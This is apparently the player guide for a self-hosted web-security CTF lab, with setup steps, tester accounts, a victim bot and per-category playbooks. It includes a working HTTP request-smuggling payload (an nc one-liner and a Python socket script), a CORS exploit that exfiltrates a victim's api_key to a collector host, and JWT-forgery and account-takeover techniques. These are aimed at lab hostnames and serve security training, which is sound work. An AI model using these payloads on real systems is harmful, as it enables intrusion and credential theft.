# VLH-CTF — Player Guide

How to actually play the lab: accounts, tooling, and per-category approaches.
References: arch §7 (placement), §8 (tooling constraints), PRD §3 (solo self-play).

---

## 1. Getting started

```fish
./installer.sh          # deps + base image + TUI
./installer.sh --hosts  # optional: lab hostnames in /etc/hosts (host-browser play)
./run-tui.sh            # deploy a profile, watch logs/activity, export
```

Pick a target:

- **DSLTV** (start here): TUI → DSLTV → category → subclass. The sidecar binds
  `:8119`. One subclass at a time (Docker-enforced).
- **ASLV standalone**: TUI → ASLV → module (`m1`–`m5`, ports 18021–18026).
- **ASLV full-chain**: TUI → ASLV → Full-chain (everything behind
  `http://<vhost>:18024`).

With `/etc/hosts` installed, browse e.g. `http://victim.target.lab:8119/`. Without
it, every host-browser vhost can be reached per-request with:

```fish
curl --resolve victim.target.lab:8119:127.0.0.1 http://victim.target.lab:8119/
curl --resolve attacker.target.lab:8119:127.0.0.1 http://attacker.target.lab:8119/
curl --resolve edge.aslv.lab:18021:127.0.0.1 http://edge.aslv.lab:18021/
```

## 2. Accounts

| Account | Password | Role |
|---|---|---|
| `0xnhsec` | `vlh-tester-01` | known tester (you) |
| `Noshiro` | `vlh-tester-02` | known tester (second browser profile / two-party sim) |
| `usr_<8 hex>` | random 16 chars | **innocent** — never in player scope |
| `admin` | random | **admin** — never in player scope |

The innocent's identity is discovered through *legitimate leak points* (an
enumeration bug, an over-exposing API response) — never guessed. Innocent/admin
passwords exist only in the container-internal seed log and the grading registry.

## 3. The solo self-play model

You play both attacker and victim (PRD §3):

- **Browser categories (CORS/CSRF/OAuth):** use two *isolated browser profiles*
  (e.g. Firefox Multi-Account Containers — not incognito): one logged in as the
  attacker/tester, one as the victim. Devtools-only testing misses
  SameSite/origin behavior (arch §8).
- **DSLTV victim bot:** the base runtime also gives you a *server-side victim
  simulation* on the collector vhost:

  ```fish
  curl -X POST http://collector.target.lab:8119/victim \
       -H 'Content-Type: application/json' \
       --resolve collector.target.lab:8119:127.0.0.1 \
       -d '{
         "url": "http://victim.target.lab:8119/api/secret",
         "origin": "http://attacker.target.lab:8119",
         "referer": "http://attacker.target.lab:8119/pages/exploit.html",
         "method": "GET"
       }'
  ```

  The bot logs in as the innocent, fetches `url` with their session cookie,
  follows redirects (cookie jar), and — when you pass `origin` — pipes the
  response to the exfil verifier with cross-site context (this models the
  SOP-permitted read a vulnerable `ACAO` would grant a real attacker page).
  Options: `method`/`body` (CSRF), `sso: true` (OAuth labs — the bot first
  visits the subclass's `GET /__sso` to establish the innocent's *client-app*
  session), `cookies` (session-fixation labs). The response shows every hop
  (URL, status, `Location` — fragments included → implicit-grant capture).

- **Why write the exploit page anyway?** Because it is the *real artifact*. The
  bot only simulates the victim's fetch; the actual cross-site read/CSRF payload
  you author on the exploit server is what a live victim would run. Author it,
  host it, then let the bot execute it (or drive it from your victim browser
  profile). `GET http://attacker.target.lab:8119/leaks` shows every hit
  attacker-space hosts received, with `Referer`/`Origin` — use it for
  Referer-leak style labs.

- **Exploit server (PortSwigger-style):** on the attacker vhost,

  ```fish
  curl -X PUT http://attacker.target.lab:8119/pages/x.html \
       -H 'Content-Type: text/html' \
       --resolve attacker.target.lab:8119:127.0.0.1 \
       --data-binary @exploit.html
  ```

  then `http://attacker.target.lab:8119/pages/x.html`. Any *other*
  `*.target.lab` host also lands on the attacker vhost (wildcard catch-all) —
  use `victim-evil.target.lab`, `evilclient.target.lab` etc. for regex-bypass
  labs (WeakOriginRegex, SubdomainTrust, RedirectUriBypass).

## 4. Tooling constraints (arch §8 — read before the HTTP labs)

- **Smuggling (CL.TE / TE.CL / TE.TE) and duplicate-Host tests are untestable
  with normal HTTP clients.** Python `requests`, JS `fetch` and default `curl`
  normalize headers/whitespace — exactly the ambiguity smuggling exploits.
  Use **raw sockets**:

  - `nc` (type the request; mind CRLFs — a here-doc piped in is more reliable):

    ```fish
    printf 'POST / HTTP/1.1\r\nHost: victim.target.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /internal/flag HTTP/1.1\r\nHost: victim.target.lab\r\nX: ' | nc 127.0.0.1 8119
    ```

  - Python `socket` (full control, the recommended way):

    ```python
    import socket

    def send(raw, host="127.0.0.1", port=8119, timeout=5):
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(raw)
        out = b""
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass
        finally:
            s.close()
        return out

    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: victim.target.lab\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 6\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"GET /internal/flag HTTP/1.1\r\n"
        b"Host: victim.target.lab\r\n"
        b"X: "          # smuggled prefix — poisons the next request on the connection
    )
    print(send(payload).decode("latin-1"))
    ```

  - **Burp Repeater**: select the requests → right-click → *Send group in
    sequence (single connection)*. Never two separate tabs on separate
    connections.

- **Browsers cannot set the `Host` header.** For host-header labs use
  `/etc/hosts` entries (`./installer.sh --hosts`, or add `evil.aslv.lab` etc. by
  hand) plus a browser, or `curl --resolve`:

  ```fish
  curl --resolve internal.aslv.lab:18024:127.0.0.1 http://internal.aslv.lab:18024/
  curl -H 'X-Forwarded-Host: internal.aslv.lab' http://aslv.lab:18024/
  ```

  Duplicate-Host and header-order tricks again need raw sockets / Burp.

- **The M1 backend and DSLTV HTTP subclasses never auto-repair framing** — raw
  TCP or tightly constrained listeners by design (NFR-5). If your HTTP client
  "fixes" your malformed request, that client is wrong for this lab.

## 5. Category playbooks (DSLTV)

Each subsection: the bug, the intended approach, and where the flag appears.
Start a subclass via the TUI; everything below is on `http://<vhost>:8119` (or
the ASLV equivalent port/vhost).

### CORS (event-verified)

1. Find the reflecting/trusting `Origin` handling on the victim app (probe
   `Origin:` request headers, watch `ACAO`/`ACAH`/credentials in responses).
2. **Write the real artifact**: an exploit page on the attacker server that does
   `fetch('http://victim.target.lab:8119/api/secret', {credentials:'include'})`
   and exfiltrates the response body (the innocent's `api_key`) to
   `collector.target.lab:8119/collect`.
3. Execute it: victim browser profile visiting the page, and/or the victim bot
   with `origin`/`referer` set (the bot pipes the fetched response into the
   verifier with cross-site context).
4. `GET http://collector.target.lab:8119/verify` → `{"verified":true,"flag":...}`
   when the dual check passes (cross-site context **and** the innocent's
   session-bound `api_key` in the payload).

Per-subclass flavor: reflected `Origin` (baseline); `Origin: null` via a
sandboxed iframe; flawed regex (attack from `victim-evil.target.lab`); seeded
compromised subdomain under `*.target` trust.

### CSRF (event-verified)

Same minting flow, but the win state is a **row change on the innocent account**
(classic: `recovery_email` → attacker-controlled value). Per-subclass entry
constraint: no token at all / unexpected `Content-Type` / method switch / omit
the token parameter (existence check) / token not bound to the session /
`SameSite=None` cookies. Use the victim bot with `method` + `body`, or an
auto-submitting form/fetch page on the exploit server.

### IDOR (resource-resident)

Log in as a tester, find object references (numeric ids, file paths, UUIDs),
walk them toward the innocent's objects. The flag is *inside* the innocent
object (document/record/file). `WriteDelete`: the flag confirms a successful
unauthorized modification/deletion of the innocent's object.

### BAC (resource-resident)

Authorization is misplaced or bypassable rather than absent: vertical escalation
(tester → admin resource), horizontal (another regular user's resource), role
parameter tampering, HTTP method switch around the guard, cross-tenant access,
workflow step-skipping, mass assignment into a role field. Flag sits in the
target resource/state.

### JWT (identity-gated)

The gated endpoint returns the flag only for a claim combo the issuer never
mints (`sub=<innocent>` + `role=admin`). Work through: `alg:none`; weak HMAC
secret (crack offline with a wordlist); RS256→HS256 algorithm confusion (sign
with the public key); `jku` pointing at your JWKS; embedded `jwk`; `kid`
injection/path traversal; expired-token replay after logout. Grab the innocent's
identifier from legitimate leak points first — you need `sub` to be right.

### AUTH (identity-gated / warm-up)

`NoRateLimit`: brute-force the seeded weak-password account (no lockout, no
delay). `ResetTokenPredictable`: user enumeration (folded-in prerequisite) →
observe/reset tokens in the mailbox → derive the pattern → take over the
innocent → flag requires `auth_method=reset` provenance. `MfaBypass`:
direct-endpoint and response-tampering variants. `SessionFixation`: fixate a sid
(victim bot `cookies` option adopts it) and hijack. `DefaultCreds`: warm-up,
`admin/admin`.

### OAuth (identity-gated)

Full flows live on the victim vhost (client app) with the AS embedded in the
same container. `sso: true` on the victim bot makes it establish the innocent's
client-app session first (login-CSRF / linking labs). Play: redirect_uri regex
bypass (code lands on your page); missing `state` (login-CSRF: make the victim
process *your* code → linked identities); pre-auth linking (register with the
innocent's unverified email, then social-login); Referer code leak (callback
page loads your attacker-hosted asset — check `/leaks`); implicit grant
(token in the URL fragment — visible in the bot's hop list); scope creep
(over-broad scope + `sub=innocent`); no PKCE (intercept the simulated
custom-scheme callback).

### HTTP (location-locked) — raw sockets only

`/internal/flag` is **unrouted at the edge** (not merely unlinked): only a
smuggled request on a desynced connection reaches it. CL.TE / TE.CL / TE.TE
(each front-end parses one framing standard and forwards the other). Host labs:
`HostResetPoison` (poison a reset link → token in the mailbox → innocent
takeover → flag), `HostRoutingBypass` (internal admin vhost via Host /
duplicate-Host / `X-Forwarded-Host`), `HostCachePoison` (cut candidate —
in-container `proxy_cache`). See §4 for tooling.

### API (resource-resident / stage-gated / location-locked)

`Bola`/`Bfla`/`Bopla` are the classic definitions (object / function / property
level); `ShadowVersion` hides the flag behind an old route version;
`MassAssignEsc` is two-stage (mass-assign `role` → flag1 in your profile →
claim-checked admin endpoint → flag2 — stage 2 cannot be skipped);
`SsrfInternal` puts the flag on an internal metadata sidecar reachable only via
SSRF in the profile-image URL; `SensitiveFlow` requires completing a bot-checked
limited-item checkout whose record contains the flag.

## 6. ASLV notes (standalone → full-chain)

- Standalone mode gives you the same flags as full mode for that module
  (FR-12) — learn each module alone first.
- Full mode is where the **trust edges** become exploitable: e.g. M4 excessive
  data exposure leaks the innocent UUID → M3 cross-tenant IDOR → innocent email
  → M5 predictable reset → takeover → JWT forge → M4 admin endpoint (canonical
  chain A). Every ASLV flag resource carries pivot material for the next edge.
- Mail (MailHog at `mail.aslv.lab`) and activity logs are **token carriers,
  never flag carriers**.
- M1 smuggling reaches internal-only endpoints of M3/M4; host-header poisoning
  steers reset links.

## 7. Verifying wins

- Event-verified: `GET /verify` on the collector (vhost `collector.aslv.lab` /
  `collector.target.lab`, or the loopback mgmt ports — see `deployment.md`).
- Everything else: the flag string itself, in the gated response.
- Stuck? The manifests list every subclass's win condition in one line
  (`manifests/dsltv-manifest.yaml`) — reading it is fair play; the flag system
  guarantees knowing the win condition ≠ getting the flag.
